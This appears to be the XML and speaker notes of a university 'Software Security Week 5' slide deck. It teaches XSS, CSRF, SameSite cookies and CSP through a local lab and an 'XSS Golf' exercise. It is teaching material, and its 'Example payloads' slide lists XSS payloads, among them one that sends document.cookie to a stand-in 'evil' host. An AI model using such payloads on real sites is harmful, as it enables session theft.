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Hook: pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust." ~2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Roadmap, 1 min. Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser).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1-min bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding.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Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ. ~5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Drive home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it. ~4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 row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone). Be clear DOM isn't part of today's graded tasks. ~6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These are the XSS Golf payloads. There's no filter in this app to explain a bypass for — correct that instinct if it comes up. The context point (HTML body vs attribute vs JS vs URL) is still the real learning; `"&gt;` breaks out of an attribute first. ~6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Live payoff for "context matters" — one escaper is right for some of the 4 sinks and wrong for others, computed live rather than asserted (3 verdicts: EXECUTES / BROKEN / SAFE — a wrecked script tag is not "safe" either). Ties straight into the Defenses slide's "encode per context." ~4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Contrast with XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a comment. Don't let "SameSite fixes CSRF" stand unqualified — this week's own fixed_app.py sets SameSite=Strict+HttpOnly+Secure and the CSRF PoC still works, because /comments never checks a session or token at all. ~5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step-by-step version of the bullets just covered — walk both panels left to right once. Land on the footnote: fixed_app.py kills the XSS but the CSRF still works, because encoding an output and checking a token are two unrelated fixes. ~4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Make it real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next. ~3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Quick reference for the worksheet — these three are what's graded this week. Clickjacking (CWE-1021) isn't part of this lab; don't cite it here. ~1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payoff. #1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). Be accurate about CSP here: this lab's escaping already neutralizes every payload before CSP would ever matter, so students will NOT see a CSP violation fire in the console today — it's set as a header, its blocking behavior is asserted, not demonstrated, in this sandbox. ~6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Explain before lab: this app is local, not Juice Shop; solo, not a bonus-round competition. The real graded turn is running fixed_app.py and showing escaping stops the golf payloads while CSRF still gets through — that contrast is the point. ~3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Logistics. Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. Q6 of the quiz asks for their own scoring payload + the sink it hit.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Logistics. Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. Q6 of the quiz asks for their own scoring payload + the sink it hit.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Before/after + the reasoning note — the CSRF note is graded on getting the SameSite-doesn't-equal-authorization distinction right, not on claiming the defense worked. Remind the AI-resilient tasks count.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Recap. Cold-call: "where is the XSS bug — input or output?" (output rendering). Second cold-call: "if SameSite=Strict is set, why did CSRF still work today?" (the endpoint never checked who was asking). ~2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Cliffhanger: "Next week — change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop ready.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502920"/>
            <a:ext cx="1691640" cy="6766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178308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300" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E3520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 5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="603504" y="2240280"/>
            <a:ext cx="7955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0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XSS &amp; Client-Side Risks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="384048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Nutthakorn Chalaemwongwan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Today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82880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16093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browser security model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XSS: reflected / stored / DOM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CSRF + SameSite cookies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 Security Policy (CSP)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🎮 Game: XSS Golf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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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Recap — Week 4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207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6061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Injection = data interpreted as code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Parameterized queries fix SQLi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idea returns today — in the browser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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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Browser security model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207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6061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Same-Origin Policy (SOP): scripts only read data from same origin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 = scheme + host + port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Cookies, DOM, storage scoped per origin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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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XSS = injection into the page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822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1325880"/>
            <a:ext cx="7680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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E3520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Attacker JavaScript runs in the victim's browser, in the site's origin.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457200" y="2313432"/>
            <a:ext cx="8229600" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8163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731520" y="2423160"/>
            <a:ext cx="76809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Steal cookies/sessions, keylog, rewrite the page, pivot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Maps to OWASP A05:2025 Injection (output side)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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flavors of XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="26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25880"/>
          <a:ext cx="8229600" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4114800"/>
                <a:gridCol w="4114800"/>
              </a:tblGrid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0E1726"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Type</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="125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520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0E1726"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Where the payload lives</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="125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5205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</a:rPr>
                        <a:t>Reflected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</a:rPr>
                        <a:t>in the request, echoed back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</a:rPr>
                        <a:t>Stored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</a:rPr>
                        <a:t>saved server-side, served to others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3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</a:rPr>
                        <a:t>DOM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</a:rPr>
                        <a:t>client-side JS writes untrusted data to the DOM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6" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3191256"/>
            <a:ext cx="8229600" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9302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7" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3300984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Today's graded app (vulnerable_app.py) implements reflected + stored only; DOM XSS is optional, via the ungraded Juice Shop target</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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Example payloads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932688"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5882"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1020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640080" y="1399032"/>
            <a:ext cx="78638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9FE7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&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;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9FE7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&lt;img src=x onerror=alert(1)&gt;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9FE7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"&gt;&lt;svg onload=alert(1)&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2423160"/>
            <a:ext cx="8229600" cy="1499616"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4878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731520" y="2532888"/>
            <a:ext cx="76809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 matters: HTML body vs attribute vs JS vs URL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vulnerable_app.py filters nothing — every payload here fires as-is; the &lt;img onerror&gt; form isn't "the one that sneaks past a filter," it's just 3 characters longer than &lt;script&gt;alert(1)&lt;/script&gt; (28 vs. 25) — a real golf trade-off, not a bypass technique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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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Try it — one value, four sinks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1325880"/>
            <a:ext cx="80467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input, landing in an HTML text node, an unquoted attribute, an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href="…", and a &lt;script&gt; string — at once. Pick an escaper, see which sinks it actually protects.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Try it live: /sim/xss-context (interactive simulation, web only)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7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CSRF — riding the user's session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810512"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4040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15910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Browser auto-sends cookies → attacker forges a state-changing request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defenses: anti-CSRF tokens, checking Origin/Referer, and the endpoint actually checking who's asking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SameSite=Strict alone stops the cookie from attaching cross-site — it does not stop a request from being accepted if the endpoint never checks authorization in the first place (today's lab proves this)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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 cookie, opposite directions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1325880"/>
            <a:ext cx="80467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 diagram: Two stacked panels comparing stored XSS with CSRF, using the same attacker/server/victim actors. Stored XSS: attacker posts a script, the victim loads it, it runs in the victim's origin and steals the cookie (no HttpOnly) — fixed by output encoding, not SameSite, since the payload is already same-origin. CSRF: the victim visits the attacker's page, which auto-submits a form; the browser attaches the cookie itself and the server can't tell the victim never meant to send it — fixed by SameSite plus a CSRF token the server actually checks, not HttpOnly, since no script ever reads the cookie. (web only)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7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Real-world: British Airways (2018)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408176"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5195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Attackers injected malicious JS (Magecart) into BA's site/app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Script skimmed credit-card details as users typed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~380k payment records skimmed; ICO proposed a £183M fine, finalized at £20M (2020, ~89% reduction)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457200" y="2898648"/>
            <a:ext cx="8229600" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2898648"/>
            <a:ext cx="7680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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E3520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Client-side injection = real money + real fines.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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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CWE mapping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207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6061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CWE-79 — Cross-site scripting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CWE-352 — CSRF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CWE-1004 — cookie set without HttpOnly (this week's cookie-theft task)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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Defenses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920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810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 encoding per context (HTML/attr/JS/URL)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Framework auto-escaping (don't bypass with innerHTML/dangerouslySetInnerHTML)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 Security Policy — a defense-in-depth header, set alongside escaping — it doesn't replace it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HttpOnly + SameSite cookies; anti-CSRF tokens and an endpoint that actually checks who's asking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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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⛳ Game — XSS Golf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="132588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Craft the shortest payload that pops alert(1) / steals a cookie against vulnerable_app.py.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457200" y="2240280"/>
            <a:ext cx="8229600" cy="1298448"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5634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731520" y="2350008"/>
            <a:ext cx="768096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Solo scoring by character count (no filter to beat — it's a golf exercise, not a bypass race)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Defend: run fixed_app.py — same payloads, now escaped — then prove CSRF still works against it and explain why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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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Lab steps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822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1325880"/>
            <a:ext cx="7680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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E3520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📋 Worksheet 5 — labs/week05-xss-client-side/worksheet.md (Part 3) · kickoff: docker compose up → http://localhost:8080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502920" y="2313432"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E35205"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="23134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17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1051560" y="2313432"/>
            <a:ext cx="7589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 reflected + stored XSS in vulnerable_app.py (DOM XSS via Juice Shop is optional/ungraded)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3044952"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E35205"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="304495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17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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1051560" y="3044952"/>
            <a:ext cx="75895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Demonstrate cookie theft via the stored payload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3520440"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E35205"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="35204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17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500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1051560" y="3520440"/>
            <a:ext cx="75895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fixed_app.py — confirm output encoding + CSP now block your XSS payloads</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17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Lab steps (cont.)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502920" y="1325880"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E35205"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1325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17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1051560" y="1325880"/>
            <a:ext cx="7589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Demonstrate CSRF still succeeds against fixed_app.py — explain why SameSite didn't stop it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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Deliverable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719072"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4255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14996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XSS type with payload + context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Escaping + CSP that blocks them (show before/after)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Short note: why CSRF still succeeds against fixed_app.py despite SameSite=Strict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Audit the AI / EiPE / Prompt Problem (see worksheet)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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takeaways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408176"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5195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XSS is injection on the output side — encode for the context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CSP is defense-in-depth, not a substitute for encoding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SameSite cookies stop the cookie attaching cross-site — they don't stop a request being accepted if the endpoint never checks authorization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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8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737360"/>
            <a:ext cx="7863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Questions?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="283464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3520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week: Authentication, sessions &amp; access control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0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Software Security · Week 5</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Nutthakorn Chalaemwongwan</dc:creator>
  <cp:lastModifiedBy>Nutthakorn Chalaemwongwan</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-13T18:30:26Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-13T18:30:26Z</dcterms:modified>
</cp:coreProperties>
</file>